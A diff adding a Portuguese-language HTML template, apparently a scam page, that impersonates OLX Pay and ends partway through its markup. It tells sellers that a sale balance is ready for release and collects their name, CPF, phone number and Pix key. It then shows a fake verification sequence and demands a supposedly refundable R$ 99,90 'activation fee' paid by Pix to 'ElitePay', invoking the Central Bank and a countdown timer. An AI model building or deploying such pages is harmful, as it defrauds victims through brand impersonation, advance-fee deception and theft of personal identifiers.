@@ -1,0 +1,1421 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Carteira - Liberação do Pagamento da Venda | OLX Pay</title>
+  <meta name="description" content="Libere o saldo da sua venda com segurança através da carteira oficial OLX Pay." />
+  <link rel="icon" type="image/x-icon" href="/static/images/cards/pix.svg" />
+
+  <!-- Google Fonts: Albert Sans & Inter -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Albert+Sans:wght@400;500;600;700;800;900&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+
+  <style>
+    :root {
+      --olx-purple: #6e0ad6;
+      --olx-purple-dark: #5808ab;
+      --olx-purple-light: #f3ebfc;
+      --olx-purple-btn: #7B02E8;
+      --olx-orange: #f28000;
+      --olx-orange-hover: #d97300;
+      --olx-green: #00a650;
+      --olx-green-light: #e6f7ee;
+      --text-primary: #1a1b1c;
+      --text-secondary: #55585b;
+      --text-muted: #8c8f94;
+      --bg-page: #ffffff;
+      --bg-card: #f8fafc;
+      --border-color: #e2e8f0;
+      --radius-sm: 8px;
+      --radius-md: 16px;
+      --radius-lg: 24px;
+      --radius-pill: 999px;
+      --font-main: 'Albert Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      font-family: var(--font-main);
+      background-color: var(--bg-page);
+      color: var(--text-primary);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      line-height: 1.4;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* Container Principal */
+    .app-viewport {
+      width: 100%;
+      max-width: 480px;
+      min-height: 100vh;
+      background: #ffffff;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+      box-shadow: 0 0 40px rgba(0, 0, 0, 0.05);
+    }
+
+    /* Top Bar (Header idêntico ao screenshot) */
+    .app-header {
+      height: 56px;
+      padding: 0 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid rgba(0, 0, 0, 0.04);
+      background: #ffffff;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .header-left {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .hamburger-icon {
+      width: 22px;
+      height: 18px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      cursor: pointer;
+    }
+
+    .hamburger-icon span {
+      display: block;
+      height: 2.2px;
+      width: 100%;
+      background-color: #1a1b1c;
+      border-radius: 2px;
+    }
+
+    .header-title {
+      font-size: 17px;
+      font-weight: 700;
+      color: var(--text-primary);
+      letter-spacing: -0.2px;
+    }
+
+    .header-badge {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      padding: 4px 10px;
+      background: var(--olx-purple-light);
+      border-radius: var(--radius-pill);
+      font-size: 11px;
+      font-weight: 800;
+      color: var(--olx-purple);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    /* Área de Conteúdo Dinâmico */
+    .content-area {
+      flex: 1;
+      padding: 24px 20px 100px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Steps Transitions */
+    .step-screen {
+      display: none;
+      flex-direction: column;
+      animation: fadeIn .3s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+    }
+
+    .step-screen.active {
+      display: flex;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(8px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* === STEP 1: APRESENTAÇÃO (MATCHING EXACT SCREENSHOT) === */
+    .illustration-wrapper {
+      width: 100%;
+      padding: 20px 0 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .promo-title {
+      font-size: 23px;
+      font-weight: 800;
+      color: #1a1b1c;
+      text-align: center;
+      line-height: 1.25;
+      margin: 16px 0 10px;
+      letter-spacing: -0.4px;
+    }
+
+    .promo-subtitle {
+      font-size: 15px;
+      font-weight: 400;
+      color: var(--text-muted);
+      text-align: center;
+      line-height: 1.45;
+      margin-bottom: 24px;
+      padding: 0 10px;
+    }
+
+    /* Card com detalhes da venda notificada */
+    .sale-summary-card {
+      background: #fbfbfe;
+      border: 1px solid #ede9fe;
+      border-radius: var(--radius-md);
+      padding: 16px 18px;
+      margin-bottom: 24px;
+    }
+
+    .summary-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 7px 0;
+      font-size: 13.5px;
+      border-bottom: 1px dashed #ede9fe;
+    }
+
+    .summary-row:last-child {
+      border-bottom: none;
+      padding-bottom: 0;
+    }
+
+    .summary-label {
+      color: var(--text-secondary);
+      font-weight: 500;
+    }
+
+    .summary-value {
+      font-weight: 700;
+      color: var(--text-primary);
+      text-align: right;
+    }
+
+    .summary-value.highlight {
+      font-size: 16px;
+      color: var(--olx-purple);
+      font-weight: 800;
+    }
+
+    /* Dots Indicator (Identical to screenshot) */
+    .dots-indicator {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 7px;
+      margin-bottom: 28px;
+    }
+
+    .dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #e2d9f3;
+      transition: all 0.3s ease;
+    }
+
+    .dot.active {
+      background: var(--olx-purple);
+      width: 8px;
+      height: 8px;
+    }
+
+    /* === FORMULÁRIO (STEP 2) === */
+    .form-section-title {
+      font-size: 20px;
+      font-weight: 800;
+      color: #1a1b1c;
+      margin-bottom: 6px;
+      letter-spacing: -0.3px;
+    }
+
+    .form-section-subtitle {
+      font-size: 13.5px;
+      color: var(--text-secondary);
+      margin-bottom: 20px;
+      line-height: 1.45;
+    }
+
+    .input-group {
+      margin-bottom: 16px;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+    }
+
+    .input-label {
+      font-size: 12.5px;
+      font-weight: 700;
+      color: var(--text-primary);
+      margin-bottom: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .input-hint {
+      font-size: 11px;
+      color: var(--text-muted);
+      font-weight: 400;
+    }
+
+    .input-field {
+      width: 100%;
+      height: 48px;
+      padding: 0 16px;
+      background: #ffffff;
+      border: 1.5px solid var(--border-color);
+      border-radius: var(--radius-sm);
+      font-size: 14.5px;
+      font-family: inherit;
+      color: var(--text-primary);
+      outline: none;
+      transition: all 0.2s ease;
+    }
+
+    .input-field:focus {
+      border-color: var(--olx-purple);
+      box-shadow: 0 0 0 3px rgba(110, 10, 214, 0.1);
+    }
+
+    .input-field.is-valid {
+      border-color: var(--olx-green);
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%2300a650' stroke-width='3' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='20 6 9 17 4 12'%3E%3C/polyline%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right 14px center;
+      background-size: 16px;
+    }
+
+    .input-field.is-invalid {
+      border-color: #ef4444;
+      background-color: #fffaf0;
+    }
+
+    .error-feedback {
+      font-size: 11.5px;
+      color: #ef4444;
+      font-weight: 600;
+      margin-top: 4px;
+      display: none;
+    }
+
+    /* === STEP 3: LOADING SCREENS (ANIMATED VERIFICATION) === */
+    .loading-card {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 40px 10px;
+    }
+
+    .spinner-shield {
+      width: 80px;
+      height: 80px;
+      position: relative;
+      margin-bottom: 28px;
+    }
+
+    .spinner-ring {
+      width: 100%;
+      height: 100%;
+      border: 4px solid #f3ebfc;
+      border-top-color: var(--olx-purple);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    .spinner-center-icon {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      color: var(--olx-purple);
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .loading-title {
+      font-size: 20px;
+      font-weight: 800;
+      color: #1a1b1c;
+      margin-bottom: 8px;
+    }
+
+    .loading-status-text {
+      font-size: 14px;
+      color: var(--text-secondary);
+      margin-bottom: 24px;
+      min-height: 40px;
+    }
+
+    .progress-bar-container {
+      width: 100%;
+      height: 8px;
+      background: #f1f5f9;
+      border-radius: var(--radius-pill);
+      overflow: hidden;
+      margin-bottom: 24px;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #7B02E8, #A855F7);
+      border-radius: var(--radius-pill);
+      transition: width 0.4s ease;
+    }
+
+    .verification-checklist {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      text-align: left;
+    }
+
+    .check-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 13px;
+      color: var(--text-muted);
+      transition: all 0.3s ease;
+    }
+
+    .check-item.done {
+      color: var(--text-primary);
+      font-weight: 600;
+    }
+
+    .check-badge {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background: #f1f5f9;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #94a3b8;
+      font-size: 11px;
+    }
+
+    .check-item.done .check-badge {
+      background: var(--olx-green-light);
+      color: var(--olx-green);
+    }
+
+    /* === STEP 4: TAXA DE PRIMEIRA VENDA (100% REEMBOLSÁVEL) === */
+    .fee-guarantee-box {
+      background: linear-gradient(135deg, rgba(123, 2, 232, 0.05), rgba(242, 128, 0, 0.05));
+      border: 2px solid #7B02E8;
+      border-radius: var(--radius-md);
+      padding: 20px;
+      margin-bottom: 20px;
+      position: relative;
+    }
+
+    .guarantee-badge-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      padding: 4px 12px;
+      background: #7B02E8;
+      color: #ffffff;
+      font-size: 11px;
+      font-weight: 800;
+      border-radius: var(--radius-pill);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 12px;
+    }
+
+    .fee-price-large {
+      font-size: 34px;
+      font-weight: 900;
+      color: #1a1b1c;
+      letter-spacing: -0.5px;
+      margin-bottom: 6px;
+    }
+
+    .refund-statement-alert {
+      background: #fef8ee;
+      border: 1px solid #fde4be;
+      border-radius: var(--radius-sm);
+      padding: 12px;
+      font-size: 13px;
+      color: #8f4b00;
+      line-height: 1.45;
+      margin-top: 14px;
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+    }
+
+    .breakdown-box {
+      background: #ffffff;
+      border: 1px solid var(--border-color);
+      border-radius: var(--radius-sm);
+      padding: 14px;
+      margin: 16px 0 0;
+    }
+
+    .breakdown-line {
+      display: flex;
+      justify-content: space-between;
+      font-size: 13px;
+      padding: 5px 0;
+      color: var(--text-secondary);
+    }
+
+    .breakdown-line.total {
+      font-size: 15px;
+      font-weight: 800;
+      color: var(--olx-green);
+      border-top: 1.5px dashed var(--border-color);
+      padding-top: 8px;
+      margin-top: 4px;
+    }
+
+    /* === STEP 5: PIX ELITEPAY === */
+    .pix-container-box {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      padding: 10px 0;
+    }
+
+    .pix-qrcode-frame {
+      width: 210px;
+      height: 210px;
+      background: #ffffff;
+      border: 2px solid #ede9fe;
+      border-radius: var(--radius-md);
+      padding: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 8px 24px rgba(123, 2, 232, 0.08);
+      margin-bottom: 18px;
+    }
+
+    .pix-qrcode-frame img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+    }
+
+    .pix-copia-cola-wrap {
+      width: 100%;
+      background: #f8fafc;
+      border: 1.5px dashed #cbd5e1;
+      border-radius: var(--radius-sm);
+      padding: 12px;
+      margin-bottom: 14px;
+      font-family: monospace;
+      font-size: 12px;
+      color: var(--text-secondary);
+      word-break: break-all;
+      max-height: 72px;
+      overflow-y: auto;
+      text-align: left;
+    }
+
+    .timer-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 6px 14px;
+      background: #fff4ea;
+      color: #b45309;
+      border-radius: var(--radius-pill);
+      font-size: 12.5px;
+      font-weight: 700;
+      margin-bottom: 18px;
+    }
+
+    /* Botão Fixo Inferior (Padrão Screenshot do Usuário) */
+    .bottom-bar {
+      position: fixed;
+      bottom: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 100%;
+      max-width: 480px;
+      padding: 14px 20px 20px;
+      background: #ffffff;
+      border-top: 1px solid rgba(0, 0, 0, 0.04);
+      z-index: 100;
+    }
+
+    /* O Botão exato circulado em vermelho no screenshot:
+       Pill button com fundo branco, borda alaranjada/terracota e texto alaranjado,
+       ou com estado preenchido e transição suave */
+    .btn-action-pill {
+      width: 100%;
+      height: 50px;
+      border-radius: var(--radius-pill);
+      border: 1.8px solid #f28000;
+      background: #ffffff;
+      color: #f28000;
+      font-family: inherit;
+      font-size: 16px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      cursor: pointer;
+      transition: all 0.25s ease;
+      box-shadow: 0 2px 8px rgba(242, 128, 0, 0.1);
+    }
+
+    .btn-action-pill:hover, .btn-action-pill:active {
+      background: #f28000;
+      color: #ffffff;
+      box-shadow: 0 4px 14px rgba(242, 128, 0, 0.25);
+    }
+
+    .btn-action-pill.btn-primary-purple {
+      background: var(--olx-purple-btn);
+      border-color: var(--olx-purple-btn);
+      color: #ffffff;
+      box-shadow: 0 4px 14px rgba(123, 2, 232, 0.25);
+    }
+
+    .btn-action-pill.btn-primary-purple:hover {
+      background: var(--olx-purple-dark);
+      border-color: var(--olx-purple-dark);
+    }
+
+    .btn-action-pill:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+
+    /* Toast Notification */
+    .toast-msg {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%) translateY(-100px);
+      background: #1e293b;
+      color: #ffffff;
+      padding: 12px 22px;
+      border-radius: var(--radius-pill);
+      font-size: 13.5px;
+      font-weight: 700;
+      z-index: 1000;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+      transition: transform 0.35s cubic-bezier(0.16, 1, 0.3, 1);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .toast-msg.show {
+      transform: translateX(-50%) translateY(0);
+    }
+
+    .toast-msg.success {
+      background: #00a650;
+    }
+
+    .toast-msg.error {
+      background: #ef4444;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Toast Notificação -->
+  <div id="toast" class="toast-msg">Mensagem</div>
+
+  <div class="app-viewport">
+    
+    <!-- Top Header (Padrão Carteira OLX Pay) -->
+    <header class="app-header">
+      <div class="header-left">
+        <div class="hamburger-icon" onclick="showToast('Menu da Carteira OLX Pay', 'info')">
+          <span></span>
+          <span></span>
+          <span></span>
+        </div>
+        <span class="header-title">Carteira</span>
+      </div>
+      <div class="header-badge">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        OLX Pay
+      </div>
+    </header>
+
+    <!-- Conteúdo Dinâmico com Passos -->
+    <main class="content-area">
+
+      <!-- ═════════════════════════════════════════════════════════════════════════
+           PASSO 1: APRESENTAÇÃO & BOAS-VINDAS (EXATO MATCH COM O SCREENSHOT)
+      ═════════════════════════════════════════════════════════════════════════ -->
+      <section class="step-screen active" id="step-1">
+        
+        <!-- Ilustração Central Idêntica à Imagem Enviada -->
+        <div class="illustration-wrapper">
+          <svg width="260" height="230" viewBox="0 0 260 230" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <!-- Nuvem/Forma orgânica de fundo lavanda -->
+            <path d="M210 115C215 155 190 195 150 205C105 215 65 190 45 155C25 120 40 75 75 55C110 35 150 45 180 65C200 80 205 95 210 115Z" fill="#F3E8FF" />
+            <ellipse cx="60" cy="180" rx="35" ry="18" fill="#F5EEFD" />
+            <ellipse cx="215" cy="85" rx="20" ry="12" fill="#EDE9FE" />
+
+            <!-- Sombra do celular -->
+            <rect x="76" y="36" width="108" height="174" rx="24" fill="rgba(123, 2, 232, 0.12)" />
+
+            <!-- Corpo do Smartphone -->
+            <rect x="74" y="32" width="108" height="172" rx="22" fill="#FFFFFF" stroke="#E2E8F0" stroke-width="2.5" />
+
+            <!-- Tela do Smartphone -->
+            <g clip-path="url(#phone-screen-clip)">
+              <!-- Área superior roxa viva -->
+              <rect x="78" y="36" width="100" height="100" fill="url(#purple-grad)" />
+
+              <!-- Câmera dot & Speaker -->
+              <circle cx="89" cy="46" r="3.5" fill="#FFFFFF" opacity="0.9" />
+              <rect x="98" y="44" width="18" height="3" rx="1.5" fill="#FFFFFF" opacity="0.7" />
+
+              <!-- Notificação / Card superior no visor -->
+              <rect x="94" y="58" width="68" height="10" rx="5" fill="#FFFFFF" opacity="0.3" />
+
+              <!-- Círculo central roxo escuro com seta branca -->
+              <circle cx="128" cy="100" r="21" fill="#4C068A" />
+              <!-- Seta apontando para direita -->
+              <path d="M123 100H133M133 100L129 96M133 100L129 104" stroke="#FFFFFF" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+
+              <!-- Seção inferior branca -->
+              <rect x="78" y="130" width="100" height="74" fill="#FFFFFF" />
+
+              <!-- Botão Laranja "Pagar / Liberar" (idêntico ao screenshot) -->
+              <rect x="98" y="146" width="60" height="18" rx="9" fill="#F28000" />
+              <text x="128" y="159" font-family="'Albert Sans', sans-serif" font-size="9" font-weight="800" fill="#FFFFFF" text-anchor="middle">Pagar</text>
+
+              <!-- Barras simuladas de dados -->
+              <rect x="106" y="171" width="44" height="3.5" rx="1.75" fill="#CBD5E1" />
+
+              <!-- Botões virtuais na base do celular -->
+              <circle cx="104" cy="188" r="2.5" fill="#94A3B8" />
+              <rect x="126" y="186" width="4" height="4" rx="1" fill="#94A3B8" />
+              <path d="M152 189L148 185H156L152 189Z" fill="#94A3B8" />
+            </g>
+
+            <defs>
+              <clipPath id="phone-screen-clip">
+                <rect x="78" y="36" width="100" height="164" rx="18" />
+              </clipPath>
+              <linearGradient id="purple-grad" x1="78" y1="36" x2="178" y2="136" gradientUnits="userSpaceOnUse">
+                <stop stop-color="#7B02E8" />
+                <stop offset="1" stop-color="#5B02B5" />
+              </linearGradient>
+            </defs>
+          </svg>
+        </div>
+
+        <!-- Títulos idênticos ao estilo de comunicação da OLX -->
+        <h1 class="promo-title">Agora você também pode liberar seu saldo pelo aplicativo da OLX</h1>
+        <p class="promo-subtitle">Chega de maquininhas de cartão, burocracia e demora no repasse de pagamentos.</p>
+
+        <!-- Resumo da Venda Identificada -->
+        <div class="sale-summary-card">
+          <div class="summary-row">
+            <span class="summary-label">Vendedor Titular</span>
+            <span class="summary-value" id="disp-seller-name">{{ seller_name or 'Vendedor Titular' }}</span>
+          </div>
+          <div class="summary-row">
+            <span class="summary-label">Comprador</span>
+            <span class="summary-value" id="disp-buyer-name">{{ buyer_name or 'Cliente Confirmado' }}</span>
+          </div>
+          <div class="summary-row">
+            <span class="summary-label">Produto Vendido</span>
+            <span class="summary-value" id="disp-product-name">{{ product_name or 'iPhone 13 Pro 128GB Grafite' }}</span>
+          </div>
+          <div class="summary-row">
+            <span class="summary-label">Data da Venda</span>
+            <span class="summary-value" id="disp-sale-date">{{ sale_date or '24/11/2026' }}</span>
+          </div>
+          <div class="summary-row">
+            <span class="summary-label">Saldo a Resgatar</span>
+            <span class="summary-value highlight" id="disp-sale-value">R$ {{ sale_value or '2.850,00' }}</span>
+          </div>
+        </div>
+
+        <!-- Dots Indicator (Passo 1 ativo) -->
+        <div class="dots-indicator">
+          <div class="dot active"></div>
+          <div class="dot"></div>
+          <div class="dot"></div>
+          <div class="dot"></div>
+        </div>
+
+        <div style="flex:1"></div>
+      </section>
+
+      <!-- ═════════════════════════════════════════════════════════════════════════
+           PASSO 2: FORMULÁRIO DE IDENTIFICAÇÃO DO TITULAR (LEAD)
+      ═════════════════════════════════════════════════════════════════════════ -->
+      <section class="step-screen" id="step-2">
+        <h2 class="form-section-title">Confirmação de Titularidade</h2>
+        <p class="form-section-subtitle">Para transferir o saldo de <strong style="color:var(--olx-purple)" id="form-sale-value-tag">R$ {{ sale_value or '2.850,00' }}</strong>, informe os dados oficiais do titular da conta.</p>
+
+        <!-- Campo: Nome Completo -->
+        <div class="input-group">
+          <label class="input-label" for="lead-fullname">
+            Nome Completo do Titular *
+            <span class="input-hint">Conforme documento</span>
+          </label>
+          <input type="text" id="lead-fullname" class="input-field" placeholder="Ex: João da Silva Santos" autocomplete="name" />
+          <div class="error-feedback" id="err-fullname">Por favor, digite seu nome e sobrenome completos.</div>
+        </div>
+
+        <!-- Campo: CPF -->
+        <div class="input-group">
+          <label class="input-label" for="lead-cpf">
+            CPF do Titular *
+            <span class="input-hint">Validação oficial</span>
+          </label>
+          <input type="tel" id="lead-cpf" class="input-field" placeholder="000.000.000-00" maxlength="14" autocomplete="off" />
+          <div class="error-feedback" id="err-cpf">CPF inválido. Verifique os dígitos digitados.</div>
+        </div>
+
+        <!-- Campo: Telefone / WhatsApp -->
+        <div class="input-group">
+          <label class="input-label" for="lead-phone">
+            Telefone / WhatsApp de Contato *
+            <span class="input-hint">Com DDD</span>
+          </label>
+          <input type="tel" id="lead-phone" class="input-field" placeholder="(00) 00000-0000" maxlength="15" autocomplete="tel" />
+          <div class="error-feedback" id="err-phone">Telefone inválido. Informe um DDD e número celular válidos.</div>
+        </div>
+
+        <!-- Campo: Chave Pix de Destino -->
+        <div class="input-group">
+          <label class="input-label" for="lead-pix-key">
+            Chave Pix para Receber o Saldo *
+            <span class="input-hint">Onde o dinheiro cairá</span>
+          </label>
+          <div style="display:flex;gap:8px;margin-bottom:8px">
+            <select id="lead-pix-type" class="input-field" style="width:120px;font-size:13px;padding:0 8px">
+              <option value="cpf">CPF</option>
+              <option value="telefone">Telefone</option>
+              <option value="email">E-mail</option>
+              <option value="aleatoria">Aleatória</option>
+            </select>
+            <input type="text" id="lead-pix-key" class="input-field" style="flex:1" placeholder="Informe sua chave Pix" />
+          </div>
+          <div class="error-feedback" id="err-pix">Informe a chave Pix que receberá o repasse da venda.</div>
+        </div>
+
+        <!-- Campo: Banco de Destino -->
+        <div class="input-group">
+          <label class="input-label" for="lead-bank">
+            Banco de Preferência
+            <span class="input-hint">Instituição financeira</span>
+          </label>
+          <select id="lead-bank" class="input-field">
+            <option value="Nubank">Nubank (Nu Pagamentos)</option>
+            <option value="Inter">Banco Inter</option>
+            <option value="Itaú">Itaú Unibanco</option>
+            <option value="Bradesco">Banco Bradesco</option>
+            <option value="Banco do Brasil">Banco do Brasil</option>
+            <option value="Santander">Santander Brasil</option>
+            <option value="Caixa">Caixa Econômica Federal</option>
+            <option value="C6 Bank">C6 Bank</option>
+            <option value="Mercado Pago">Mercado Pago</option>
+            <option value="Outro">Outro Banco</option>
+          </select>
+        </div>
+
+        <!-- Dots Indicator (Passo 2 ativo) -->
+        <div class="dots-indicator" style="margin-top:10px">
+          <div class="dot"></div>
+          <div class="dot active"></div>
+          <div class="dot"></div>
+          <div class="dot"></div>
+        </div>
+      </section>
+
+      <!-- ═════════════════════════════════════════════════════════════════════════
+           PASSO 3: TELAS DE CARREGAMENTO & VERIFICAÇÃO INTELIGENTE
+      ═════════════════════════════════════════════════════════════════════════ -->
+      <section class="step-screen" id="step-3">
+        <div class="loading-card">
+          
+          <div class="spinner-shield">
+            <div class="spinner-ring"></div>
+            <div class="spinner-center-icon">
+              <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            </div>
+          </div>
+
+          <h3 class="loading-title">Verificando Protocolo de Repasse</h3>
+          <p class="loading-status-text" id="loading-stage-label">Consultando transação no protocolo OLX Pay...</p>
+
+          <div class="progress-bar-container">
+            <div class="progress-bar-fill" id="loading-progress-bar"></div>
+          </div>
+
+          <div class="verification-checklist">
+            <div class="check-item" id="chk-1">
+              <div class="check-badge">1</div>
+              <span>Validação cadastral de titularidade do CPF</span>
+            </div>
+            <div class="check-item" id="chk-2">
+              <div class="check-badge">2</div>
+              <span>Conexão segura com a chave Pix bancária</span>
+            </div>
+            <div class="check-item" id="chk-3">
+              <div class="check-badge">3</div>
+              <span>Liberação do comprovante de repasse OLX Pay</span>
+            </div>
+          </div>
+
+        </div>
+      </section>
+
+      <!-- ═════════════════════════════════════════════════════════════════════════
+           PASSO 4: TAXA DE PRIMEIRA VENDA (100% REEMBOLSÁVEL)
+      ═════════════════════════════════════════════════════════════════════════ -->
+      <section class="step-screen" id="step-4">
+        <h2 class="form-section-title">Validação da Primeira Venda</h2>
+        <p class="form-section-subtitle">Para ativação segura de contas na OLX Pay e conformidade com o Banco Central, é aplicada a taxa de verificação da primeira transação.</p>
+
+        <!-- Box Principal com Valor e Garantia de Reembolso -->
+        <div class="fee-guarantee-box">
+          <div class="guarantee-badge-pill">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>
+            100% Reembolsável
+          </div>
+
+          <div style="font-size:12.5px;color:var(--text-secondary);font-weight:700;text-transform:uppercase;letter-spacing:0.5px">Tarifa Temporária de Ativação</div>
+          <div class="fee-price-large">R$ 99,90</div>
+
+          <!-- Alerta Obrigatório de Devolução Integral -->
+          <div class="refund-statement-alert">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#d97300" stroke-width="2.2" style="flex-shrink:0;margin-top:1px"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+            <div>
+              <strong>Garantia de Devolução Imediata:</strong><br />
+              O valor de <strong>R$ 99,90 será 100% REEMBOLSADO e creditado de volta</strong> diretamente na sua chave Pix junto com o valor integral da sua venda (<span id="txt-calc-sum">R$ 99,90 + R$ {{ sale_value or '2.850,00' }}</span>).
+            </div>
+          </div>
+
+          <!-- Demonstrativo dos Valores a Receber -->
+          <div class="breakdown-box">
+            <div class="breakdown-line">
+              <span>Saldo da Venda a Receber:</span>
+              <strong id="bk-sale-val">R$ {{ sale_value or '2.850,00' }}</strong>
+            </div>
+            <div class="breakdown-line">
+              <span>Taxa Temporária de Verificação:</span>
+              <span>R$ 99,90</span>
+            </div>
+            <div class="breakdown-line" style="color:#00a650">
+              <span>Reembolso Integral Imediato:</span>
+              <strong>+ R$ 99,90</strong>
+            </div>
+            <div class="breakdown-line total">
+              <span>Total a Receber na sua Chave Pix:</span>
+              <strong id="bk-total-val">R$ 2.949,90</strong>
+            </div>
+          </div>
+        </div>
+
+        <div style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:var(--radius-sm);padding:12px;font-size:12px;color:var(--text-muted);display:flex;align-items:center;gap:8px;margin-bottom:14px">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#6e0ad6" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          <span>Operação criptografada com liquidação instantânea via Pix pelo Banco Central.</span>
+        </div>
+
+        <!-- Dots Indicator (Passo 3 ativo) -->
+        <div class="dots-indicator">
+          <div class="dot"></div>
+          <div class="dot"></div>
+          <div class="dot active"></div>
+          <div class="dot"></div>
+        </div>
+      </section>
+
+      <!-- ═════════════════════════════════════════════════════════════════════════
+           PASSO 5: PAGAMENTO PIX VIA ELITEPAY (GERAÇÃO REAL API)
+      ═════════════════════════════════════════════════════════════════════════ -->
+      <section class="step-screen" id="step-5">
+        <h2 class="form-section-title" style="text-align:center">Pagamento Seguro Pix</h2>
+        <p class="form-section-subtitle" style="text-align:center">Escaneie o QR Code ou copie a chave para efetuar a validação reembolsável de <strong>R$ 99,90</strong>.</p>
+
+        <div class="pix-container-box">
+          
+          <div class="timer-badge">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+            <span id="pix-countdown">15:00</span> restantes para liberação
+          </div>
+
+          <!-- QR Code Real -->
+          <div class="pix-qrcode-frame">
+            <img id="pix-qr-img" src="" alt="QR Code Pix" />
+          </div>
+
+          <!-- Copia e Cola -->
+          <div style="width:100%;text-align:left;margin-bottom:4px;font-size:12px;font-weight:700;color:var(--text-secondary)">Código Pix Copia e Cola:</div>
+          <div class="pix-copia-cola-wrap" id="pix-code-text">Carregando chave Pix...</div>
+
+          <!-- Botão Copiar Chave -->
+          <button type="button" class="btn-action-pill btn-primary-purple" id="btn-copy-pix" onclick="copyPixCode()" style="margin-bottom:14px;height:46px">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+            Copiar Código Pix
+          </button>
+
+          <!-- Status em Tempo Real -->
+          <div style="display:flex;align-items:center;gap:8px;font-size:13px;color:var(--text-secondary);margin-top:6px">
+            <div class="dot active" style="background:#10b981;animation:pulse 1.5s infinite"></div>
+            <span id="pix-realtime-status">Aguardando pagamento no banco...</span>
